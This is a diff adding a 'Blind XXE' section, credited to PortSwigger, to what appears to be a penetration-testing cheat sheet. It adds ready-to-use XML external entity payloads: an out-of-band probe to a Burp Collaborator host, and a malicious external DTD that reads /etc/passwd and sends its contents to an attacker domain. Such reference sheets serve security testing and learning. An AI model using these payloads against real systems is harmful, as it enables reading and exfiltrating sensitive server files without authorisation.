@@ -517,6 +517,34 @@ More examples
 		</admin>
 ```
 
+Blind XXE (Examples taken from portswigger)
+```
+Testing for blind XXE:
+
+XXE payload
+<?xml version="1.0" ?>
+<!DOCTYPE root [
+<!ENTITY % ext SYSTEM "http[:]//burpcollaborator[.]net/x"> %ext;
+]>
+
+<param>&xxe;</param>
+
+
+blind XXE using malicious external DTD:
+
+XXE payload
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE data [<!ENTITY % xxe SYSTEM "https://attackerdomain/exploit.dtd"> %xxe;]
+<stockCheck><productId>1</productId><storeId>&send;</storeId></stockCheck>
+
+exploit.dtd
+
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attackerdomain/?x=%file;'>">
+%eval;
+%exfil;
+```
+
 ### xss via file upload
 https://medium.com/@lucideus/xss-via-file-upload-lucideus-research-eee5526ec5e2
 
